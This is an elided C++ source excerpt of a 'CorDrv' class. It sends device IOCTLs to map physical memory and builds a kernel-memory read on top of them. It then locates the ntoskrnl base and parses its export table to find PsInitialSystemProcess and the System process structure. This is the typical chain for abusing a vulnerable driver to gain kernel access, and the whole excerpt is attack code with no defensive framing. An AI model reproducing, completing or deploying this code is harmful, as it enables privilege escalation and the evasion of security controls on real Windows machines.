...
bool CorDrv::SendIoctl(DWORD IoControlCode, void* InBuffer, DWORD InSize,
    ...
    BOOL r = FALSE;
   {
        ...
        r = DeviceIoControl(m_Device, IoControlCode, InBuffer, InSize, OutBuffer, OutSize, &br, nullptr);
    }
...
uint64_t CorDrv::MapBuffer(uint64_t Address, uint64_t Size, uint64_t Param) {
    ...
    Size += Address & (static_cast<uint64_t>(si.dwPageSize) - 1);
...
bool CorDrv::ReadPhysicalMemory(uint64_t PhysicalAddress, void* Buffer, size_t Size) {
            ...
            uint64_t newMapped = MapBuffer(PhysicalAddress, Size, 0);
            if (!newMapped)
                return false;

    memcpy(Buffer, reinterpret_cast<void*>(newMapped), Size);
    UnmapBuffer(newMapped);
    return true;
}
...
BOOL CorDrv::KRead(ULONGLONG kva, void* buf, DWORD size)
{
    ULONGLONG physAddr = LinearToPhys(kva);
    ...
    uint64_t mapped = MapBuffer(pageBase, mapSize, 0);
...
ULONGLONG CorDrv::GetNtoskrnlBaseVAScan()
{
...
uint64_t CorDrv::GetSystemEprocessVA() {
    ...
    uint64_t base = GetNtoskrnlBaseVAScan();


    uintptr_t B = 0;
    //  DWORD e_lfanew = ReadPhys<DWORD>(TranslateVirtualAddress(m_SystemDTB, base + 0x3C));
    DWORD e_lfanew = 0;
    KRead(base + 0x3C, &e_lfanew, sizeof(DWORD));

    uint64_t ntBase = base + e_lfanew;
    DWORD exportDirRVA = 0;
    KRead(ntBase + 0x88, &exportDirRVA, sizeof(DWORD));

    IMAGE_EXPORT_DIRECTORY exportDir{};
    KRead(base + exportDirRVA, &exportDir, sizeof(IMAGE_EXPORT_DIRECTORY));

    for (DWORD i = 0; i < exportDir.NumberOfNames; i++) {
        DWORD nameRVA = 0;
        KRead(base + exportDir.AddressOfNames + i * 4, &nameRVA, sizeof(DWORD));

        char name[128] = {};
        KRead(base + nameRVA, &name, 127);
        /* for (int j = 0; j < 127; j++) {
             char temp{};
        ...
        if (strcmp(name, "PsInitialSystemProcess") == 0) {
            WORD ordinal{};
            KRead(base + exportDir.AddressOfNameOrdinals + i * 2, &ordinal, sizeof(WORD));
            DWORD funcRVA{};
            KRead(base + exportDir.AddressOfFunctions + ordinal * 4, &funcRVA, sizeof(DWORD));
            /* ReadPhys<DWORD>(
                 TranslateVirtualAddress(m_SystemDTB, base + exportDir.AddressOfFunctions + ordinal * 4)
             );*/
            KRead(base + funcRVA, &B, sizeof(uintptr_t));
            /* B = ReadPhys<uintptr_t>(
                 TranslateVirtualAddress(m_SystemDTB, base + funcRVA)
             );*/
            break;
        }
    }
